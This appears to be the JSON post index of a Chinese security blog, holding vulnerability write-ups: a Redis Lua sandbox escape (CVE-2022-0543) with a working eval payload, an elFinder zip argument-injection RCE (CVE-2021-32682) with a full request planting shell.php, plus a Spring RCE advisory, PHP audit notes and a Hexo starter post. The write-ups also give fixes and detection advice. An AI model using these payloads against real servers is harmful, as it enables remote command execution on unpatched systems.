[{"id":"4851b902ea2223fecb14c4248effd820","title":"Redis-Escape-Rce","content":"[CVE-2022-0543] Redis-Lua-Sandbox-Escape-and-Remote-Code-Execution （redis 沙箱逃逸和远程代码执行——0x00:漏洞影响版本Ubuntu的Redis-Server\n\n\n发行版本\n状态\n\n\n\nbionic\n该版本不存在漏洞\n\n\nfocal\n目前最新版本:5:5.0.7-2ubuntu0.1(已修复)\n\n\nimpish\n目前最新版本:5:6.0.15-1ubuntu0.1(已修复)\n\n\ntrusty\n该版本不存在漏洞\n\n\nupstream\n目前最新版本 :6.0.16-1+deb11u2(已修复)\n\n\nxenial\n超出标准支持\n\n\nDebain的Redis-Server\n\n\n发行版本\n状态\n\n\n\nstretch&#x2F;stretch (security)\n目前最新版本: 3:3.2.6-3+deb9u3 (已修复)\n\n\nbuster\n版本: 5:5.0.3-4+deb10u3 (存在漏洞)\n\n\nbuster (security)\n目前最新版本: 5:5.0.14-1+deb10u2 (已修复)\n\n\nbullseye\n版本: 5:6.0.15-1 (存在漏洞)\n\n\nbullseye (security)\n目前最新版本:5:6.0.16-1+deb11u2 (已修复)\n\n\nbookworm, sid\n目前最新版本:5:6.0.16-2 (已修复)\n\n\n0x01:漏洞复现复现就用vulhub的虚拟环境,，先把服务开起来:\ngit clone https://github.com/vulhub/vulhub.git\ncd vulhub/redis/CVE-2022-0543\ndocker-compose up -d   //开启服务\ndocker ps  //检测一下容器是否部署好\n\n\n直接redis连上，p神这个镜像含有非授权访问的漏洞，连上发送payload。\nredis-cli -h &lt;你的部署镜像的ip>\n\neval 'local io_l = package.loadlib(\"/usr/lib/x86_64-linux-gnu/liblua5.1.so.0\", \"luaopen_io\"); local io = io_l(); local f = io.popen(\"id\", \"r\"); local res = f:read(\"*a\"); f:close(); return res' 0\n\n\n可以看到命令执行。\n0x02：漏洞原理Debian以及Ubuntu发行版的源在打包Redis时，在Lua沙箱中遗留了一个对象package，攻击者可以利用这个对象提供的方法加载动态链接库liblua里的函数，进而逃逸沙箱执行任意命令。\n我们看一下源码：[http://download.redis.io/releases/redis-6.0.15.tar.gz](http://download.redis.io/releases/redis-6.0.15.tar.gz)\n这里注释掉了\nluaLoadLib(lua, LUA_LOADLIBNAME, luaopen_package);\n\n\n但是在Debian的系统里面将这句话写入内容中了，Debian make 的源码如下：\ndebian/lua_libs_debian.c:\n    echo \"// Automatically generated; do not edit.\" >$@\n    echo \"luaLoadLib(lua, LUA_LOADLIBNAME, luaopen_package);\" >>$@\n    set -e; for X in $(LUA_LIBS_DEBIAN_NAMES); do \\\n        echo \"if (luaL_dostring(lua, \\\"$$X = require('$$X');\\\"))\" >>$@; \\\n        echo \"    serverLog(LL_NOTICE, \\\"Error loading $$X library\\\");\" >>$@; \\\n    done\n    echo 'luaL_dostring(lua, \"module = nil; require = nil;\");' >>$@\n\n导致了漏洞的产生。\n我们借助Lua沙箱中遗留的变量package的loadlib函数来加载动态链接库/usr/lib/x86_64-linux-gnu/liblua5.1.so.0里的导出函数luaopen_io。在Lua中执行这个导出函数，即可获得io库，再使用其执行命令：\n值得注意的是，不同环境下的liblua库路径不同，你需要指定一个正确的路径。在Vulhub环境（Ubuntu fiocal）中，这个路径是/usr/lib/x86_64-linux-gnu/liblua5.1.so.0。\n这里的函数也可以使用luaopen_os函数，但是前提是要知道liblua的路径\nlocal io_l = package.loadlib(\"/usr/lib/x86_64-linux-gnu/liblua5.1.so.0\", \"luaopen_io\");\nlocal io = io_l();\nlocal f = io.popen(\"id\", \"r\");\nlocal res = f:read(\"*a\");\nf:close();\nreturn res\n\n0x03：lua逃逸问题早在之前redis 就存在lua 的逃逸问题：\n比如loadstring 函数未进行过滤，导致代码执行。\nhttps://gist.github.com/corsix/6575486\n0x04：修复建议Lua 初始化的末尾添加package&#x3D;nil 。\nluaL_dostring(lua, &quot;module = nil; require = nil;package=nil;&quot;)\nids规则针对package.loadlib进行拦截。\n0x05：资料参考https://www.freebuf.com/news/325729.html\nhttps://github.com/vulhub/vulhub/blob/master/redis/CVE-2022-0543/README.zh-cn.md\nhttps://www.adminxe.com/3620.html\nhttps://github.com/redis/redis-hashes\nhttps://bbs.ichunqiu.com/forum.php?mod=viewthread&amp;tid=14202&amp;highlight=xp\n","slug":"redis-sand-box-rce","date":"2022-03-31T17:08:49.000Z","categories_index":"","tags_index":"漏洞分析","author_index":"神林"},{"id":"5be2d45f1267b8ebe5bb9dc94fd9c754","title":"Spring-Core-Rce 0day 通告","content":"漏洞时间线：2022-03-29：晚上业内师傅们开始公布漏洞利用成功，并未公布漏洞细节，github出现钓鱼（0day,红线标注，微步沙箱并未检测出威胁，经分析是钓鱼exe。），截至目前，仓库已经删除。\n\n2022-03-30：漏洞影响开始发酵，开始出现部分exp代码。\n\n漏洞影响：使用了Spring框架，jdk≥9.0，会造成影响，由于刚受到log4j2的影响，很多企业业务都升级到了jdk 9 以上，现在又出现新的漏洞实在是哭笑不得：\n\n临时修复建议：1、应用中全局搜索@InitBinder注解，看看方法体内是否调用dataBinder.setDisallowedFields方法，如果发现此代码片段的引入，则在原来的黑名单中，添加**{“class.“,”Class.“,”.class.“, “.Class.“}，**在应用系统的项目包下新建以下全局类，并保证这个类被Spring加载到(推荐在Controller所在的包中添加)完成类添加后，需对项目进行重新编译打包和功能验证测试。\n2、在WAF等网络防护设备上，根据实际部署业务的流量情况，实现对“class.”“Class.”“.class.”“.Class.”等字符串的规则过滤，并在部署过滤规则后，对业务运行情况进行测试，避免产生影响。\n参考https://github.com/IanSmith123/spring-core-rce\nhttps://www.cyberkendra.com/2022/03/springshell-rce-0-day-vulnerability.html\n","slug":"Spring-Core-Rce","date":"2022-03-30T13:51:40.000Z","categories_index":"","tags_index":"威胁通告","author_index":"神林"},{"id":"7e3aab8248542e317877e2ea637498f0","title":"php 代码审计","content":"\n详述php代码审计这件事常见cms框架：\nthinkphp\nyii 2.0\nlaravel\nphp代码审计：\n1、cms的代码审计\n2、ctf题目中实战利用\n3、针对一些开源代码审计\n手段：\n1、代码审计工具\n2、代码审计点\n3、特殊函数以及魔法函数\n利用：\n1、xss点\n2、反序列化点、pop链\n3、一些文件上传绕过的点\n4、前台getshell 才是王道\n对个人的提高影响：\n1、学到一些通用的代码审计点\n2、学到一些php漏洞点\n3、启发自己代码能力\n4、增强自己攻击杀伤链深度\n资料收集：\nhttps://mp.weixin.qq.com/s/ccLnEeMRGzYexQf9hADB9g\nhttps://www.yuque.com/burpheart/phpaudit/php-shen-ji-ji-chu_cui-ruo-han-shu-su-cha-biao\nhttps://www.php.net/manual/zh/function.proc-open.php php中文手册\nhttps://www.anquanke.com/post/id/265092 狼组安全文库\n","slug":"php-代码审计","date":"2022-03-27T15:39:39.000Z","categories_index":"","tags_index":"代码审计","author_index":"神林"},{"id":"7ea883b6d4c638116488ccef6e5f43a4","title":"elfinder rce","content":"[CVE-2021-32682] elFinder ≤ 2.1.58 RCE 分析0x00漏洞点简介elfinder 是一款开源的web文件管理器，能够对文件进行操作，漏洞点在于zip压缩存档时没有对传入的name参数进行过滤，导致使用了linux 中 zip 命令参数进行命令执行。\n0x01环境搭建环境搭建直接使用p神的vulhub 直接进行搭建：\nsudo git clone https://github.com/vulhub/vulhub.git\n\ncd 到镜像目标文件所在地\n\nsudo docker-compose up -d\n\n环境启动成功/注意开启的端口/然后就可以进行复现了\n\n\n访问服务映射的端口：\n\n找到归档功能点（图中鼠标所在位置）：\n\n紧接着按照p神文档写的漏洞点进行复现：\n\n\n要注意两点：\n1、要在压缩了1之后进行发包，后面target的值必须是两个文件的hash\n2、腾讯云发包应该是被拦截了。这里我又在本地搭建的\n这个触发点还挺有意思的，之后会继续看一下其他利用方式。这里也是利用name参数过滤不足利用了zip -TT 参数实现cmd命令执行的。\n0x02漏洞跟踪分析漏洞源码：https://github.com/Studio-42/elFinder/releases/tag/2.1.58\n分析工具：Phpstorm\n根据之前漏洞复现捕获pcap数据包进行分析：\nGET &#x2F;php&#x2F;connector.minimal.php?cmd&#x3D;archive&amp;name&#x3D;-TvTT&#x3D;id%3Eshell.php%20%23%20a.zip&amp;target&#x3D;l1_Lw&amp;targets%5B1%5D&#x3D;l1_Mi56aXA&amp;targets%5B0%5D&#x3D;l1_MS50eHQ&amp;type&#x3D;application%2Fzip HTTP&#x2F;1.1\nUser-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;98.0.4758.102 Safari&#x2F;537.36\nAccept-Encoding: gzip, deflate\nAccept: application&#x2F;json, text&#x2F;javascript, *&#x2F;*; q&#x3D;0.01\nConnection: close\nHost: 43.128.18.191\nX-Requested-With: XMLHttpRequest\nReferer: http:&#x2F;&#x2F;43.128.18.191:8080&#x2F;\nAccept-Language: en-US,en;q&#x3D;0.9,zh-CN;q&#x3D;0.8,zh;q&#x3D;0.7\n\n请求头中connector.minimal.php，get请求了cmd参数为archive，在源码中追踪一下此文件，搜索cmd未果。\n\n看一下是否存在include 或者 require 其他php文件：\n\n存在一个包含文件 autoload.php，内部全是包含调用的文件，并不能准确定位漏洞点，此时要么去猜测漏洞点文件位置，要么根据传入参数名称进行全局搜索确认，最后找到archive 自定义函数\n\n经过全局搜索寻找（偷偷看师傅们的漏洞分析），找到了archive 函数点：\n\n函数中调用了makeArchivers 自定义函数，进行跟进函数：\n\n函数代码如下所示：\n    protected function makeArchive($dir, $files, $name, $arc)\n    &#123;\n        if ($arc['cmd'] === 'phpfunction') &#123;\n            if (is_callable($arc['argc'])) &#123;\n                call_user_func_array($arc['argc'], array($dir, $files, $name));\n            &#125;\n        &#125; else &#123;\n            $cwd = getcwd();\n            if (chdir($dir)) &#123;\n                foreach ($files as $i => $file) &#123;\n                    $files[$i] = '.' . DIRECTORY_SEPARATOR . basename($file);\n                &#125;\n                $files = array_map('escapeshellarg', $files);\n\n                $cmd = $arc['cmd'] . ' ' . $arc['argc'] . ' ' . escapeshellarg($name) . ' ' . implode(' ', $files);\n                $err_out = '';\n                $this->procExec($cmd, $o, $c, $err_out, $dir);\n                chdir($cwd);\n            &#125; else &#123;\n                return false;\n            &#125;\n        &#125;\n        $path = $dir . DIRECTORY_SEPARATOR . $name;\n        return file_exists($path) ? $path : false;\n    &#125;\n\n分析发现这个函数就是我们传参进来并且进行执行的函数，内部首先对传入的name进行了字符串的处理，之后使procExec进行了执行，这里我们跟进一下procExec这个自己构造的函数，内部构造：\n\n函数内部存在proc_open 系统函数：\n\n这里proc_open 函数就是要利用的漏洞点，那我们返回来找一下最终name参数传参的一个过程，我们已知最终利用的就是procExec()，但是name并不是直接传入方法中，我们可以依据方法的调用来看一下最终是怎么进行传参，这是一个大致的函数调用流程，我们接下来从最终调用开始展开分析:\n\n首先来看elFinder.archive() 这个方法，这个方法对传入参数的name进行的存在判断，然后：\n\n接下来进入archive这个方法进行跟踪，这个方法代码跟多，我只截图name处理部分，有兴趣的可以自己跟踪分析：\n\n这里进行name字符串处理，可以看到进行了初步的字符替换然后进行拼接，最终使用uniqueName()这个函数进行了处理，我们继续跟进一下这个函数来分析这个字符串：\n\n\n处理完之后进入了remoteArchive()方法中：\n\n接着进入makeArchive()方法中进行处理：\n\n处理完成由procExec()方法进行执行，这里procExec()中调用了proc_open()这个php默认方法进行执行：\n\n字符串最终经过以下几个方法最终到达procExec()，通过proc_open() 来进行cmd 指令的操作，\nhttps:&#x2F;&#x2F;whimsical.com&#x2F;elfinder-poc-66xtTeo9wqUnNTmxEHuk3D@2Ux7TurymNRMFc1UUtu5\n这里我们看一下proc_open()方法的具体的作用：\nhttps://www.php.net/manual/zh/function.proc-open\n\n经过修改源码运行处理，可以获取其传入name &#x3D; 1.zip 在proc_open() 执行之前字符串为\n\"zip -r9 -q '1.zip' './a.zip'\"\n\n这里我们可以利用一下linux 中的zip 命令，zip命令详解如下：\n\n也就是说我们可以控制传入的name值来实现任意命令的执行，这里我们使用zip -TT 的参数来实现任意命令执行，我们可以构造：\n\"zip -r9 -q '-TvTT=\"$(id>shell.php)\".zip' './a.txt'\"\n\n可以将等号之后的内容换成你想执行的命令。\n0x03参考链接https://xz.aliyun.com/t/10739#toc-5\nhttps://github.com/vulhub/vulhub/tree/master/elfinder/CVE-2021-32682\nhttps://websec.readthedocs.io/zh/latest/language/php/phar.html\n","slug":"elfinder-rce","date":"2022-03-25T15:45:38.000Z","categories_index":"","tags_index":"漏洞复现","author_index":"神林"},{"id":"b9663f58f18133b35bfe243f3e916a80","title":"Hello World","content":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub.\nQuick StartCreate a new post$ hexo new \"My New Post\"\n\nMore info: Writing\nRun server$ hexo server\n\nMore info: Server\nGenerate static files$ hexo generate\n\nMore info: Generating\nDeploy to remote sites$ hexo deploy\n\nMore info: Deployment\n","slug":"hello-world","date":"2022-03-24T14:18:50.422Z","categories_index":"","tags_index":"","author_index":"神林"}]